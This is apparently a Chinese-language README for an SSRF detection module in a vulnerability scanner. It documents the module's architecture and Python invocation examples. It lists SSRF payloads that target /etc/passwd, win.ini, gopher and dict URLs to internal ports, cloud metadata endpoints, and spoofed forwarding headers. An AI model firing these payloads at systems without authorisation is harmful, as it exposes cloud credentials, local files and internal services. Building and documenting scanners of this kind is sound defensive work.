# 🌐 SSRF 檢測模組

**什麼是 SSRF？**  
Server-Side Request Forgery（伺服器端請求偽造）是一種攻擊技術，攻擊者誘使伺服器對內部或第三方系統發起非預期的HTTP請求。本模組整合了內網探測、雲端元數據訪問、協議測試和帶外（OAST）驗證等多重檢測技術。

## 🏗️ 架構圖
```
┌─────────────────────────────────────────────────────────────┐
│                   智能 SSRF 檢測架構                          │
├─────────────────────────────────────────────────────────────┤
│ AI Command      │command_handler │ SmartSSRFDetector│ OAST    │
│ Interface       │               │                  │ Service │
│       ↓         │       ↓       │        ↓         │    ↓    │
│ FEATURE_SSRF_   │ FunctionTask  │ ParamSemantics   │ oast_   │
│ TEST            │ Payload       │ Analyzer         │ dispatcher│
│       │         │               │internal_address_ │         │
│       └─────────┼───────────────┼─ detector        │    ↓    │
│                 │               │        ↓         │ Callback│
│                 ↓               │ 多協議測試 +      │ 驗證    │
│         SsrfTestVector          │ 雲端探測         │         │
│         (param_semantics)       │                  │         │
└─────────────────────────────────────────────────────────────┘
```

## ⚙️ 運作流程
1. **參數語義分析** - 識別可能的 SSRF 注入點（URL、檔案路徑參數）
2. **測試向量生成** - 根據參數特性生成對應的測試 payload
3. **多層級檢測** - 執行分層檢測策略：
   - **內網探測**: 掃描 127.0.0.1、169.254.169.254（AWS 元數據）等
   - **協議測試**: file://, gopher://, dict://, ldap:// 等協議
   - **帶外驗證**: 使用 OAST 服務確認盲 SSRF
4. **結果整合** - 綜合直接響應和帶外回調確認漏洞

## 🚀 快速執行

### 方式一：直接執行檢測引擎（開發/測試用）

**適用場景**: 快速驗證、單元測試、本地開發

```bash
# 進入專案目錄
cd c:\D\fold7\AIVA-git

# 執行 SSRF 檢測測試
python -c "import asyncio; import httpx; from services.aiva_common.schemas.tasks import FunctionTaskPayload, FunctionTaskTarget; from services.features.function_ssrf.engine.ssrf_engine import SSRFEngine; exec('''
async def test_ssrf():
    # 建立任務結構
    task = FunctionTaskPayload(
        task_id=\"task_ssrf_001\",
        scan_id=\"scan_001\",
        target=FunctionTaskTarget(
            url=\"http://localhost:3000/api/fetch\",
            parameter=\"url\",
            method=\"GET\",
            parameter_location=\"query\"
        ),
        strategy=\"normal\"
    )
    
    # 建立 SSRF 引擎
    engine = SSRFEngine(
        timeout=5.0,
        max_redirects=3,
        allow_active=True,
        safe_mode=False
    )
    
    # 測試內網掃描
    print(\"=== 測試 1: 內網掃描 ===\")
    issues = await engine.check_internal_access(\"http://127.0.0.1:3000\")
    print(f\"發現 {len(issues)} 個內網訪問問題\")
    
    # 測試檔案協議
    print(\"\\n=== 測試 2: 檔案協議 ===\")
    issues = await engine.check_file_protocol(\"file:///etc/passwd\")
    print(f\"發現 {len(issues)} 個檔案協議問題\")
    
    # 測試雲端元數據
    print(\"\\n=== 測試 3: 雲端元數據 ===\")
    issues = await engine.check_cloud_metadata(\"http://169.254.169.254/latest/meta-data/\")
    print(f\"發現 {len(issues)} 個雲端元數據訪問問題\")
    
    await engine.close()

asyncio.run(test_ssrf())
''')"
```

**指令參數說明**:
- `task_id`: 任務唯一識別碼，必須以 `task_` 開頭
- `scan_id`: 掃描會話 ID，用於關聯多個任務
- `target.url`: 目標 URL，完整的 HTTP/HTTPS 位址
- `target.parameter`: 要測試的參數名稱（如 `url`, `file`, `path`）
- `target.method`: HTTP 方法 (`GET`, `POST`)
- `target.parameter_location`: 參數位置 (`query`, `body`)
- `strategy`: 檢測策略 (`normal`, `aggressive`, `stealth`)

**SSRFEngine 初始化參數**:
- `timeout`: 請求超時時間（秒），預設 5.0
- `max_redirects`: 最大重定向次數，預設 3
- `allow_active`: 是否允許主動探測，預設 True
- `safe_mode`: 安全模式（避免破壞性測試），預設 False

**四種檢測方法說明**:
1. **check_internal_access(url)**: 內網訪問檢測
   - 測試目標: `127.0.0.1`, `localhost`, `169.254.169.254` (AWS metadata)
   - 檢測是否可訪問內網資源

2. **check_file_protocol(url)**: 檔案協議檢測
   - 測試協議: `file://`, `ftp://`, `gopher://`, `dict://`
   - 檢測是否可讀取本地檔案

3. **check_cloud_metadata(url)**: 雲端元數據檢測
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - Azure: `http://169.254.169.254/metadata/instance`
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`

4. **check_protocol_confusion(url)**: 協議混淆檢測
   - 測試 URL 解析漏洞和協議繞過

**參數變化範例**:
```python
# GET 參數測試
target=FunctionTaskTarget(
    url="http://example.com/api/fetch",
    parameter="url",
    method="GET",
    parameter_location="query"
)

# POST Body 測試
target=FunctionTaskTarget(
    url="http://example.com/api/import",
    parameter="file_path",
    method="POST",
    parameter_location="body",
    json_data={"format": "json"}
)

# 圖片上傳 URL 測試
target=FunctionTaskTarget(
    url="http://example.com/api/upload_from_url",
    parameter="image_url",
    method="POST",
    parameter_location="body"
)
```

**實際測試結果範例：**
```

### 方式二：透過 Command Handler（推薦生產用法） 🔧

**適用場景**: AI 指揮架構、統一命令介面、符合 aiva_common 規範

```python
# 🎯 正確的 SSRF 命令處理器使用方式 (2025-12-03 修正)
import asyncio
from services.features.function_ssrf.command_handler import SSRFCommandHandler
from services.aiva_common.schemas.commands import AICommand, CommandType

async def test_ssrf_command_handler():
    \"\"\"標準 SSRF 命令處理器執行示例\"\"\"
    
    # 1. 創建命令處理器
    handler = SSRFCommandHandler()
    
    # 2. 構建 AI 命令 (必須包含所有必填參數)
    command = AICommand(
        command_id=\"ssrf_test_001\",
        command_type=CommandType.FEATURE_SSRF_TEST,
        target_module=\"features.ssrf\",
        payload={
            \"target_url\": \"http://localhost:3000/api/fetch\",
            \"parameters\": {\"url\": \"http://example.com\"},
            \"detection_methods\": [\"callback\"],  # callback, blind, internal_scan
            \"callback_server\": None  # 可選回調服務器
        },
        timeout=60,  # 1分鐘超時
        
        # 必填追蹤參數 (符合 aiva_common 規範)
        trace_id=\"trace_ssrf_001\",
        session_id=\"session_001\", 
        parent_command_id=None,
        callback_url=None
    )
    
    # 3. 執行命令
    result = await handler.handle_command(command)
    
    # 4. 解析結果
    print(f\"✅ 執行狀態: {result.status}\")
    print(f\"✅ 執行成功: {result.success}\")
    print(f\"⏱️ 執行時間: {result.execution_time:.2f}秒\")
    
    if result.success:
        vulnerability_found = result.result.get(\"vulnerability_found\", False)
        detection_results = result.result.get(\"detection_results\", [])
        print(f\"🎯 發現漏洞: {vulnerability_found}\")
        print(f\"🔢 檢測結果: {len(detection_results)} 個\")
        
        for result_item in detection_results:
            print(f\"  - 方法: {result_item.get('method')}\")
            print(f\"  - 載荷: {result_item.get('payload')}\")
            print(f\"  - 證據: {result_item.get('evidence')}\")
    else:
        print(f\"❌ 執行失敗: {result.error}\")
        print(f\"🔍 錯誤代碼: {result.error_code}\")
        
    return result

# 執行測試
asyncio.run(test_ssrf_command_handler())
```

**修正重點 (2025-12-03)**:
- ✅ AICommand 必須包含 `trace_id`, `session_id` 等追蹤參數
- ✅ AICommandResult 使用 `started_at`, `completed_at` 而非舊的 `timestamp`
- ✅ 錯誤處理包含 `error_code` 和 `error_details`
- ✅ 檢測器方法調用: `detect_vulnerabilities(task, client=client)`
- ✅ 參數分析器調用: `analyzer.analyze(task)` 而非 `analyze_parameters()`

**實際測試結果範例：**
```
=== SSRF 引擎實際執行測試 ===

【測試 1】內網掃描...
  ✅ 內網掃描完成，發現 1 個問題
    - SSRF_INTERNAL_ACCESS: Internal host 127.0.0.1 is reachable via SSRF

【測試 2】檔案協議檢測...
  ✅ 檔案協議檢測完成，發現 1 個問題
    - SSRF_FILE_PROTOCOL: file:// access via SSRF may expose local files

=== 測試完成 ===
```

✅ **驗證結論：SSRF 模組真實發送請求並檢測到漏洞！**

## 🚀 支援指令

### 實際使用方式（程式化調用）
```python
from services.aiva_common.schemas import AICommand, CommandType
from services.aiva_common import get_command_center

# 建立命令中心連線
command_center = get_command_center()

# SSRF 檢測命令
command = AICommand(
    command_id="ssrf_test_001",
    command_type=CommandType.FEATURE_SSRF_TEST,
    target_module="features.ssrf",
    payload={
        "target_url": "https://app.com/api/fetch",
        "test_parameters": {
            "url": "https://example.com",
            "callback": "https://webhook.site/xyz",
            "file_path": "/etc/passwd"
        },
        "internal_scan": True,
        "cloud_metadata": ["aws", "gcp", "azure"],
        "protocols": ["http", "https", "file", "gopher"],
        "oast_callback": True,
        "timeout": 30
    }
)

# 執行檢測
result = await command_center.execute(command)
```

### 何時使用？
- ✅ **適用場景**:
  - **URL 參數功能**: 圖片獲取、網頁預覽、文件下載
  - **Webhook 回調**: API 通知、第三方整合
  - **代理服務**: 內容代理、API 轉發
  - **雲端服務**: 檔案處理、數據同步
  
- ⚠️ **使用注意**:
  - 避免掃描生產環境的關鍵內部服務
  - 注意可能觸發的安全警報
  - 謹慎測試雲端元數據端點
  - 確保 OAST 回調域名的安全性

### 如何使用？
```python
# 1. 基本內網探測
internal_scan = {
    "target_url": "https://webapp.com/proxy",
    "test_parameters": {"target_url": "http://example.com"},
    "internal_scan": True,
    "targets": [
        "127.0.0.1:22",      # SSH
        "127.0.0.1:3306",    # MySQL
        "127.0.0.1:6379",    # Redis
        "192.168.1.1"        # 內網閘道
    ]
}

# 2. 雲端元數據檢測
cloud_metadata = {
    "target_url": "https://cloud-app.com/fetch-image",
    "test_parameters": {"image_url": "https://example.com/pic.jpg"},
    "cloud_metadata": ["aws", "gcp", "azure"],
    "metadata_endpoints": [
        "http://169.254.169.254/latest/meta-data/",  # AWS
        "http://metadata.google.internal/",          # GCP
        "http://169.254.169.254/metadata/instance"   # Azure
    ]
}

# 3. 協議測試
protocol_test = {
    "target_url": "https://app.com/load-config",
    "test_parameters": {"config_path": "/app/config.json"},
    "protocols": ["file", "gopher", "dict", "ldap"],
    "payloads": [
        "file:///etc/passwd",
        "file:///c:/windows/win.ini",
        "gopher://127.0.0.1:25/",
        "dict://127.0.0.1:11211/stat"
    ]
}

# 4. 帶外（Blind SSRF）檢測
blind_ssrf = {
    "target_url": "https://app.com/webhook",
    "test_parameters": {"callback_url": "https://legitimate.com"},
    "oast_callback": True,
    "oast_service_url": "http://localhost:8083",
    "blind_payloads": [
        "http://{oast_token}.your-domain.com",
        "https://{oast_token}.your-domain.com/ssrf-test"
    ]
}

# 5. 綜合檢測（推薦）
comprehensive_ssrf = {
    "target_url": "https://complex-app.com/api/process",
    "test_parameters": {
        "data_source": "https://external-api.com/data",
        "backup_url": "https://backup.com/save",
        "template_path": "/templates/default.html"
    },
    "internal_scan": True,
    "cloud_metadata": ["aws", "gcp", "azure"],
    "protocols": ["http", "https", "file", "gopher", "dict"],
    "oast_callback": True,
    "follow_redirects": False,  # 避免重定向干擾
    "custom_headers": {
        "X-Forwarded-For": "127.0.0.1",
        "X-Real-IP": "169.254.169.254"
    }
}
```

## 🔧 核心能力
- **多協議支援**: HTTP/HTTPS/File/Gopher/Dict/LDAP 全覆蓋
- **雲端元數據檢測**: AWS/GCP/Azure 元數據服務探測
- **帶外驗證**: OAST 服務實現 blind SSRF 確認
- **智能參數分析**: 根據參數名稱和語義選擇測試策略
- **內網掃描**: 自動化內部服務發現和端口探測
- **繞過技術**: IP 編碼、重定向利用、DNS 重綁定

## 🎯 後續發展方向
- [ ] **容器環境檢測** - Docker socket、Kubernetes API 探測
- [ ] **IPv6 支援** - 擴展到 IPv6 網路環境檢測
- [ ] **DNS 重綁定** - 高級 DNS 攻擊技術實現
- [ ] **機器學習參數識別** - AI 自動識別潛在 SSRF 參數